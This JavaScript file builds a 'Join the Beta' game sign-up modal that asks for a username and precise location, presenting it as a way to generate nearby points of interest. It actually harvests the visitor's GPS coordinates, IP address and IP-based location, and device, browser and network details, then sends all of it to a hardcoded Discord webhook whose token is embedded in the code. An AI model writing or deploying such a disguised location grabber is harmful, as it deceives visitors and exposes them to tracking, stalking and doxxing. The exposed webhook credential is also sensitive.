// script.js
document.addEventListener('DOMContentLoaded', function() {
  // Discord webhook URL
  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1387573474176008253/C_r_KQUxqTYEL2P_YuF0BcnmxHGrLgHD-Rx0QBp9BLyqcoXVBvGkyUFQ07Bph4qTMU3-';
  
  // Create the main modal container
  const modal = document.createElement('div');
  modal.id = 'betaSignupModal';
  modal.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.8);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    opacity: 0;
    transform: translateY(-50px);
    transition: all 0.5s ease-out;
    backdrop-filter: blur(10px);
  `;
  
  // Create the content box
  const content = document.createElement('div');
  content.style.cssText = `
    background: linear-gradient(145deg, #111, #222);
    border-radius: 16px;
    padding: 30px;
    width: 90%;
    max-width: 450px;
    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
    border: 1px solid rgba(255, 255, 255, 0.1);
    position: relative;
    overflow: hidden;
  `;
  
  // Add animated border effect
  const borderEffect = document.createElement('div');
  borderEffect.style.cssText = `
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: linear-gradient(90deg, transparent, white, transparent);
    animation: borderFlow 3s linear infinite;
  `;
  
  // Create the title
  const title = document.createElement('h2');
  title.textContent = 'Join the Beta';
  title.style.cssText = `
    color: white;
    text-align: center;
    margin-bottom: 25px;
    font-family: 'Arial', sans-serif;
    font-weight: 300;
    letter-spacing: 1px;
    font-size: 28px;
    position: relative;
  `;
  
  // Create the username input
  const inputContainer = document.createElement('div');
  inputContainer.style.cssText = `
    margin-bottom: 25px;
    position: relative;
  `;
  
  const usernameInput = document.createElement('input');
  usernameInput.type = 'text';
  usernameInput.placeholder = 'Enter your preferred username';
  usernameInput.style.cssText = `
    width: 100%;
    padding: 15px;
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.2);
    background-color: rgba(255, 255, 255, 0.05);
    color: white;
    font-size: 16px;
    outline: none;
    transition: all 0.3s ease;
  `;
  usernameInput.addEventListener('focus', () => {
    usernameInput.style.borderColor = 'rgba(255, 255, 255, 0.5)';
    usernameInput.style.boxShadow = '0 0 0 2px rgba(255, 255, 255, 0.1)';
  });
  usernameInput.addEventListener('blur', () => {
    usernameInput.style.borderColor = 'rgba(255, 255, 255, 0.2)';
    usernameInput.style.boxShadow = 'none';
  });
  
  // Create location permission section
  const locationSection = document.createElement('div');
  locationSection.style.cssText = `
    background-color: rgba(0, 0, 0, 0.3);
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 25px;
    border-left: 3px solid #555;
    transition: all 0.3s ease;
  `;
  
  const locationTitle = document.createElement('h3');
  locationTitle.textContent = 'Location Permission';
  locationTitle.style.cssText = `
    color: white;
    margin-top: 0;
    margin-bottom: 10px;
    font-size: 16px;
    font-weight: 400;
  `;
  
  const locationText = document.createElement('p');
  locationText.textContent = 'Our game uses your location to create fun and random points of interest near you. This makes the gameplay more personalized and engaging.';
  locationText.style.cssText = `
    color: #aaa;
    margin-top: 0;
    margin-bottom: 15px;
    font-size: 14px;
    line-height: 1.5;
  `;
  
  const locationButton = document.createElement('button');
  locationButton.id = 'locationButton';
  locationButton.textContent = 'Allow Location Access';
  locationButton.style.cssText = `
    background-color: rgba(255, 255, 255, 0.1);
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    gap: 8px;
  `;
  
  // Add location icon
  const locationIcon = document.createElement('span');
  locationIcon.innerHTML = '📍';
  locationButton.prepend(locationIcon);
  
  locationButton.addEventListener('mouseover', () => {
    locationButton.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
  });
  locationButton.addEventListener('mouseout', () => {
    locationButton.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
  });
  
  // Create the play button (initially disabled)
  const playButton = document.createElement('button');
  playButton.id = 'playButton';
  playButton.textContent = 'Play!';
  playButton.disabled = true;
  playButton.style.cssText = `
    width: 100%;
    padding: 15px;
    background: linear-gradient(90deg, #333, #555);
    color: #777;
    border: none;
    border-radius: 8px;
    font-size: 18px;
    font-weight: bold;
    cursor: not-allowed;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
  `;
  
  // Status message
  const statusMessage = document.createElement('div');
  statusMessage.id = 'statusMessage';
  statusMessage.style.cssText = `
    color: #aaa;
    font-size: 12px;
    text-align: center;
    margin-top: 15px;
    min-height: 18px;
  `;
  
  // Assemble the modal
  inputContainer.appendChild(usernameInput);
  locationSection.appendChild(locationTitle);
  locationSection.appendChild(locationText);
  locationSection.appendChild(locationButton);
  
  content.appendChild(borderEffect);
  content.appendChild(title);
  content.appendChild(inputContainer);
  content.appendChild(locationSection);
  content.appendChild(playButton);
  content.appendChild(statusMessage);
  
  modal.appendChild(content);
  document.body.appendChild(modal);
  
  // Animate modal in
  setTimeout(() => {
    modal.style.opacity = '1';
    modal.style.transform = 'translateY(0)';
  }, 100);
  
  // Keyframes for border animation
  const style = document.createElement('style');
  style.textContent = `
    @keyframes borderFlow {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
  `;
  document.head.appendChild(style);
  
  // Location permission handler
  let locationGranted = false;
  let userLocation = null;
  
  locationButton.addEventListener('click', () => {
    statusMessage.textContent = 'Requesting location access...';
    
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          // Success
          locationGranted = true;
          userLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          
          locationButton.innerHTML = '✓ Location Access Granted';
          locationButton.style.color = '#4CAF50';
          locationButton.style.backgroundColor = 'rgba(76, 175, 80, 0.1)';
          locationButton.disabled = true;
          
          locationSection.style.borderLeftColor = '#4CAF50';
          
          // Enable play button if username is entered
          if (usernameInput.value.trim()) {
            playButton.disabled = false;
            playButton.style.background = 'linear-gradient(90deg, #000, #222)';
            playButton.style.color = 'white';
            playButton.style.cursor = 'pointer';
          }
          
          statusMessage.textContent = 'Location access granted!';
        },
        (error) => {
          // Error
          let errorMessage = 'Error getting location: ';
          switch(error.code) {
            case error.PERMISSION_DENIED:
              errorMessage += "You denied the request for geolocation.";
              break;
            case error.POSITION_UNAVAILABLE:
              errorMessage += "Location information is unavailable.";
              break;
            case error.TIMEOUT:
              errorMessage += "The request to get location timed out.";
              break;
            case error.UNKNOWN_ERROR:
              errorMessage += "An unknown error occurred.";
              break;
          }
          
          statusMessage.textContent = errorMessage;
          statusMessage.style.color = '#f44336';
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    } else {
      statusMessage.textContent = 'Geolocation is not supported by this browser.';
      statusMessage.style.color = '#f44336';
    }
  });
  
  // Username input validation
  usernameInput.addEventListener('input', () => {
    if (usernameInput.value.trim() && locationGranted) {
      playButton.disabled = false;
      playButton.style.background = 'linear-gradient(90deg, #000, #222)';
      playButton.style.color = 'white';
      playButton.style.cursor = 'pointer';
    } else {
      playButton.disabled = true;
      playButton.style.background = 'linear-gradient(90deg, #333, #555)';
      playButton.style.color = '#777';
      playButton.style.cursor = 'not-allowed';
    }
  });
  
  // Play button handler
  playButton.addEventListener('click', () => {
    if (!usernameInput.value.trim() || !locationGranted) return;
    
    playButton.disabled = true;
    playButton.textContent = 'Processing...';
    statusMessage.textContent = 'Preparing your game experience...';
    
    // Collect all user information
    collectUserData(usernameInput.value.trim(), userLocation);
  });
  
  // Function to send data to Discord webhook
  async function sendToDiscord(data) {
    try {
      // Format the data for Discord
      const discordMessage = {
        content: '📡 New Beta Signup - User Data Collected',
        embeds: [{
          title: 'User Information',
          color: 0x0099ff,
          fields: [
            {
              name: '👤 Username',
              value: data.username || 'Not provided',
              inline: true
            },
            {
              name: '📅 Signup Date',
              value: data.dateTime || 'Unknown',
              inline: true
            },
            {
              name: '📍 Precise Location',
              value: `${data.location.latitude}, ${data.location.longitude} (±${data.location.accuracy}m)`,
              inline: false
            },
            {
              name: '🌍 IP Location',
              value: `${data.ipData.city}, ${data.ipData.region}, ${data.ipData.country_name}`,
              inline: true
            },
            {
              name: '🖥️ Device',
              value: `${data.browserInfo.platform} | ${data.screenInfo.resolution}`,
              inline: true
            },
            {
              name: '🌐 Browser',
              value: navigator.userAgent.substring(0, 100) + '...',
              inline: false
            }
          ],
          timestamp: new Date().toISOString()
        }]
      };
      
      // Send to Discord
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordMessage)
      });
      
      if (!response.ok) {
        throw new Error('Discord webhook error');
      }
      
      return true;
    } catch (error) {
      console.error('Error sending to Discord:', error);
      return false;
    }
  }
  
  // Function to collect all user data
  async function collectUserData(username, location) {
    // Get current date and time
    const now = new Date();
    const dateTime = now.toLocaleString();
    
    try {
      // Get IP and location info (using a free API)
      const ipResponse = await fetch('https://ipapi.co/json/');
      const ipData = await ipResponse.json();
      
      // Get screen info
      const screenInfo = {
        resolution: `${window.screen.width}x${window.screen.height}`,
        available: `${window.screen.availWidth}x${window.screen.availHeight}`,
        colorDepth: `${window.screen.colorDepth}-bit`,
        pixelDepth: `${window.screen.pixelDepth}-bit`,
        orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
      };
      
      // Get hardware info
      const hardwareInfo = {
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'unknown',
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 'unknown'
      };
      
      // Get browser info
      const browserInfo = {
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
        platform: navigator.platform,
        online: navigator.onLine ? 'Online' : 'Offline',
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        doNotTrack: navigator.doNotTrack || 'unknown'
      };
      
      // Get connection info
      const connectionInfo = {
        type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'unknown',
        rtt: navigator.connection ? `${navigator.connection.rtt} ms` : 'unknown',
        saveData: navigator.connection ? (navigator.connection.saveData ? 'Enabled' : 'Disabled') : 'unknown'
      };
      
      // Prepare all the collected data
      const userData = {
        username,
        dateTime,
        location,
        ipData,
        screenInfo,
        hardwareInfo,
        browserInfo,
        connectionInfo,
        userAgent: navigator.userAgent
      };
      
      // Format for console logging
      const formattedData = `
📡 New Visitor Information Captured
Visitor details recorded on ${dateTime}

👤 User Information
▸ Username: ${username}
▸ Precise Location: ${location.latitude}, ${location.longitude} (±${location.accuracy}m)

🌍 Location Information
▸ IP Address: ${ipData.ip || 'unknown'}
▸ Location: ${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}
▸ Coordinates: ${ipData.latitude || 'unknown'}, ${ipData.longitude || 'unknown'}
▸ Postal Code: ${ipData.postal || 'unknown'}
▸ Timezone: ${ipData.timezone || 'unknown'} (UTC${ipData.utc_offset || 'unknown'})

🇺🇳 Country Details
▸ Country: ${ipData.country_name || 'unknown'} (${ipData.country || 'unknown'})
▸ ISO3 Code: ${ipData.country_code_iso3 || 'unknown'}
▸ Capital: ${ipData.country_capital || 'unknown'}
▸ Continent: ${ipData.continent_code || 'unknown'}
▸ TLD: ${ipData.country_tld || 'unknown'}
▸ EU Member: ${ipData.in_eu ? 'Yes' : 'No'}

📊 Demographics
▸ Area: ${ipData.country_area ? `${ipData.country_area} km²` : 'unknown'}
▸ Population: ${ipData.country_population ? ipData.country_population.toLocaleString() : 'unknown'}
▸ Languages: ${ipData.languages || 'unknown'}
▸ Calling Code: ${ipData.country_calling_code || 'unknown'}
▸ Currency: ${ipData.currency || 'unknown'} (${ipData.currency_name || 'unknown'})

🖥️ Network Information
▸ Network: ${ipData.network || 'unknown'}
▸ ASN: ${ipData.asn || 'unknown'}
▸ Organization: ${ipData.org || 'unknown'}
▸ IP Version: ${ipData.version || 'unknown'}

🖥️ Screen Information
▸ Resolution: ${screenInfo.resolution}
▸ Available: ${screenInfo.available}
▸ Color Depth: ${screenInfo.colorDepth}
▸ Pixel Depth: ${screenInfo.pixelDepth}
▸ Orientation: ${screenInfo.orientation}

⚙️ Hardware Information
▸ Device Memory: ${hardwareInfo.deviceMemory}
▸ CPU Cores: ${hardwareInfo.cpuCores}
▸ Max Touch Points: ${hardwareInfo.maxTouchPoints}

🌐 Browser Information
▸ Language: ${browserInfo.language}
▸ Platform: ${browserInfo.platform}
▸ Online Status: ${browserInfo.online}
▸ Cookies Enabled: ${browserInfo.cookiesEnabled}
▸ Do Not Track: ${browserInfo.doNotTrack}

📶 Connection Information
▸ Type: ${connectionInfo.type}
▸ Effective Type: ${connectionInfo.type}
▸ Downlink: ${connectionInfo.downlink}
▸ RTT: ${connectionInfo.rtt}
▸ Save Data: ${connectionInfo.saveData}

🔍 Full User Agent
${navigator.userAgent}
      `;
      
      console.log(formattedData);
      
      // Send to Discord
      const discordSuccess = await sendToDiscord(userData);
      
      if (discordSuccess) {
        statusMessage.textContent = 'Welcome to the beta! Enjoy the game.';
        statusMessage.style.color = '#4CAF50';
      } else {
        statusMessage.textContent = 'Welcome! (Data logging failed but you can still play)';
        statusMessage.style.color = '#FF9800';
      }
      
      // Close the modal after 2 seconds
      setTimeout(() => {
        modal.style.opacity = '0';
        modal.style.transform = 'translateY(-50px)';
        setTimeout(() => {
          document.body.removeChild(modal);
        }, 500);
      }, 2000);
      
    } catch (error) {
      console.error('Error collecting user data:', error);
      statusMessage.textContent = 'Error collecting some data, but you can still play!';
      statusMessage.style.color = '#f44336';
      
      // Close the modal even if there's an error
      setTimeout(() => {
        modal.style.opacity = '0';
        modal.style.transform = 'translateY(-50px)';
        setTimeout(() => {
          document.body.removeChild(modal);
        }, 500);
      }, 2000);
    }
  }
});
